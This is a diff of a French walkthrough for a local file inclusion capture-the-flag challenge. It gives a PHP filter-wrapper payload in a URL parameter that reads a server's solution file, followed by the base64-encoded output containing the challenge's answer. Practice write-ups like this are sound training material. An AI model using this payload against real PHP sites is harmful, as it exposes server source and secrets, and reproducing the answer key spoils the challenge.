@@ -14,7 +14,7 @@ Etape à suivre :
 1. Allez dans le lien LFI (Local File Inclusion) principale => [LFI](https://lfi.warchall.net/)
 
 2. Cliquer sur le logo de langue (choix de langue) => exemple : [LFI (langue)](https://lfi.warchall.net/index.php?lang=en)
-3. Effacer `en`sur le lien et le *remplacer* par la methode d'attaque *PHP Wrapper* => (https://lfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php)
+3. Effacer `en`sur le lien et le *remplacer* par la methode d'attaque *PHP Wrapper* => `php://filter/convert.base64-encode/resource=solution.php`[lien complet](https://lfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php)
 4. après, il donne des plusieur code à decoder : **PGh0bWw+Cjxib2R5Pgo8cHJlIHN0eWxlPSJjb2xvcjojMDAwOyI+dGVoIGZhbGcgc2kgbmFlciE8L3ByZT4KPHByZSBzdHlsZT0iY29sb3I6I2ZmZjsiPnRoZSBmbGFnIGlzIG5lYXIhPC9wcmU+CjwvYm9keT4KPC9odG1sPgo8P3BocCAgICAgICAgICAgICAgICAgICMgICBZT1VSX1RST1BIWSAKcmV0dXJuICdTdGVwcGluU3RvbmVzNDJQaWUnOyAjIDwtwrQgPz4K**
 5. Après decodage enligne sur [base64decode](https://www.base64decode.org/)
    
